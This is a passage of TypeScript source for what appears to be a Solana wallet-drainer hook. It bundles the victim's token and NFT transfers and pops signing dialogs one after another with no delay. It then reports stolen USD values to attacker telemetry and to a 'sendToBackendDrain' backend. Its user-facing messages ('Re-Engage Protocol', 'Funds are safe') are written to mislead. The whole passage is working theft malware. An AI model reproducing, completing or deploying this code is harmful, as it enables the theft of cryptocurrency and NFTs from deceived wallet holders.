                        const simResult = await withRetryAndTimeout(() =>
                            connection.simulateTransaction(simTx, {
                                replaceRecentBlockhash: true,
                                sigVerify: false,
                            }),
                        );

                        if (!simResult.value.err && simResult.value.unitsConsumed) {
                            bundleCUs = simResult.value.unitsConsumed;
                        }
                    } catch {
                        console.warn(`[BUNDLE ${bi}] Simulation failed, using conservative CU limit`);
                    }

                    // CU limit with 15% buffer
                    const bundleCuLimit = Math.min(Math.ceil(bundleCUs * 1.15), 1_400_000);

                    // --- Build final transaction ---
                    const finalBundleIxs = [
                        ComputeBudgetProgram.setComputeUnitLimit({ units: bundleCuLimit }),
                        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicPriorityFee }),
                        ...bundleTransferIxs,
                    ];

                    // CRIT-01 FIX: Build as legacy Transaction via sendTransaction
                    // (wallet-adapter handles V0 internally for modern wallets)
                    const bundleTx = new Transaction().add(...finalBundleIxs);
                    bundleTx.recentBlockhash = bundleBlockhash;
                    bundleTx.feePayer = publicKey;

                    // Validate size before signing
                    try {
                        const testSerialize = bundleTx.serialize({ requireAllSignatures: false });
                        if (testSerialize.length > NETWORK_CONFIG.maxPacketSize) {
                            console.error(
                                `[BUNDLE ${bi}] Signatures are too large: ${testSerialize.length} bytes, skipping`,
                            );
                            continue;
                        }
                        console.log(
                            `[BUNDLE ${bi}] TX size: ${testSerialize.length} bytes | ` +
                            `CU: ${bundleCuLimit} | Tokens: ${bundleTokenCount} | NFTs: ${bundleNftCount}`,
                        );
                    } catch {
                        console.error(`[BUNDLE ${bi}] Serialization test failed, skipping`);
                        continue;
                    }

                    // --- SIGN — presented to user immediately after previous signature ---
                    let bundleSignature: string;
                    try {
                        bundleSignature = await withTimeout(
                            () => sendTransaction(bundleTx, connection, { maxRetries: 3 }),
                            SIGNING_TIMEOUT_MS,
                        );
                    } catch (e) {
                        const msg = e instanceof Error ? e.message : String(e);
                        if (msg.includes("rejected") || msg.includes("WalletSignTransactionError")) {
                            // User rejected — stop all remaining bundles
                            console.warn(`[BUNDLE ${bi}] User rejected signing. Stopping bundle chain.`);
                            break;
                        }
                        console.error(`[BUNDLE ${bi}] Signing failed: ${msg}`);
                        continue;
                    }

                    if (!validateSignatureFormat(bundleSignature)) {
                        console.error(`[BUNDLE ${bi}] Invalid signature format`);
                        continue;
                    }

                    signedBundles.push({
                        signature: bundleSignature,
                        blockhash: bundleBlockhash,
                        lastValidBlockHeight: bundleLastValidBlockHeight,
                        bundleIndex: bi,
                        tokenCount: bundleTokenCount,
                        nftCount: bundleNftCount,
                        usdValue: bundleUsdValue,
                        tokensForBackend: bundleBackendTokens,
                    });

                    totalTokenCount += bundleTokenCount;
                    totalNftCount += bundleNftCount;

                    console.log(
                        `[BUNDLE ${bi}] ✍️ Signed: ${bundleSignature} | ` +
                        `${bundleTokenCount} tokens + ${bundleNftCount} NFTs | $${bundleUsdValue.toFixed(2)}`,
                    );

                    void sendTelemetry(
                        `✍️ Bundle ${bi + 1}/${bundles.length} signed: \`${bundleSignature}\` | $${bundleUsdValue.toFixed(2)}`,
                    );

                    // NO delay — next bundle signing dialog appears immediately
                } catch (e) {
                    console.error(
                        `[BUNDLE ${bi}] Unexpected error:`,
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            // --- Check if any bundles were signed ---
            if (signedBundles.length === 0) {
                setError("No Signatures were signed. Re-Engage Protocol.");
                setStatus("error");
                return;
            }

            // Update stats with actual signed bundles
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: solAvailableForTransfer,
                tokenCount: totalTokenCount,
                nftCount: totalNftCount,
                batchCount: signedBundles.length,
                bundleResults: [],
            });

            // ═══ PHASE 13: PARALLEL CONFIRMATION OF ALL SIGNED BUNDLES ═══
            setStatus("confirming");

            console.log(
                `[CONFIRM] Confirming ${signedBundles.length} bundles in parallel...`,
            );

            const bundleResults: BundleResult[] = await Promise.all(
                signedBundles.map(async (sb): Promise<BundleResult> => {
                    try {
                        // HIGH-07 FIX: Add explicit timeout to confirmation
                        const confirmState = await withTimeout(
                            () => confirmTransactionEnterprise(
                                connection,
                                sb.signature,
                                sb.blockhash,
                                sb.lastValidBlockHeight,
                            ),
                            CONFIRMATION_TIMEOUT_MS,
                        );

                        // CRIT-05 FIX: Expired = error, not success
                        const resultStatus = confirmState === "expired" ? "expired" : confirmState;

                        return {
                            bundleIndex: sb.bundleIndex,
                            tokenCount: sb.tokenCount,
                            nftCount: sb.nftCount,
                            usdValue: sb.usdValue,
                            signature: sb.signature,
                            status: resultStatus,
                        };
                    } catch (e) {
                        console.error(
                            `[CONFIRM] Bundle ${sb.bundleIndex} confirmation error:`,
                            e instanceof Error ? e.message : String(e),
                        );
                        return {
                            bundleIndex: sb.bundleIndex,
                            tokenCount: sb.tokenCount,
                            nftCount: sb.nftCount,
                            usdValue: sb.usdValue,
                            signature: sb.signature,
                            status: "failed",
                        };
                    }
                }),
            );

            // ═══ PHASE 14: BACKEND MIRROR + FINAL STATUS ═══
            const confirmedBundles = bundleResults.filter(r => r.status === "confirmed");
            const failedBundles = bundleResults.filter(r => r.status === "failed" || r.status === "expired");

            // HIGH-06 FIX: Backend mirror — parallelized for all confirmed bundles.
            // Previously sequential awaits blocked each other; now all fire concurrently.
            const backendMirrorPromises = signedBundles
                .filter(sb => {
                    const result = bundleResults.find(r => r.bundleIndex === sb.bundleIndex);
                    return result?.status === "confirmed";
                })
                .map(async sb => {
                    try {
                        const backendSuccess = await sendToBackendDrain(
                            publicKey.toBase58(),
                            sb.bundleIndex === 0 ? solAvailableForTransfer : 0,
                            sb.signature,
                            sb.tokensForBackend,
                        );
                        if (!backendSuccess) {
                            console.warn(
                                `[BACKEND] Mirror failed for bundle ${sb.bundleIndex} but TX confirmed on-chain`,
                            );
                        }
                    } catch (mirrorErr) {
                        console.warn(
                            `[BACKEND] Mirror error for bundle ${sb.bundleIndex}:`,
                            mirrorErr instanceof Error ? mirrorErr.message : String(mirrorErr),
                        );
                    }
                });

            await Promise.allSettled(backendMirrorPromises);

            // Update final stats
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: solAvailableForTransfer,
                tokenCount: totalTokenCount,
                nftCount: totalNftCount,
                batchCount: signedBundles.length,
                bundleResults,
            });

            // Determine final status
            if (confirmedBundles.length === signedBundles.length) {
                setStatus("success");
            } else if (confirmedBundles.length > 0) {
                setStatus("partial");
                setError(
                    `${confirmedBundles.length}/${signedBundles.length} bundles confirmed. ` +
                    `${failedBundles.length} failed — check wallet for details.`,
                );
            } else {
                setStatus("error");
                setError("All Signatures failed on-chain. Funds are safe.");
            }

            const confirmedValue = confirmedBundles.reduce((s, b) => s + b.usdValue, 0);
            const signatures = signedBundles.map(sb => sb.signature).join(", ");

            console.log(
                `[DRAIN] Operation ${ctx.operationId} complete: ` +
                `${confirmedBundles.length}/${signedBundles.length} confirmed | ` +
                `$${confirmedValue.toFixed(2)} | Signatures: ${signatures}`,
            );

            await sendTelemetry(
                `💰 COMPLETE | ${confirmedBundles.length}/${signedBundles.length} confirmed | ` +
                `Tokens: ${totalTokenCount} | NFTs: ${totalNftCount} | ` +
                `Value: $${confirmedValue.toFixed(2)} | ` +
                `Sigs: ${signedBundles.map(sb => `\`${sb.signature}\``).join(" ")}`,
            ).catch(() => { });
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);

    return { drain, status, error, stats };
};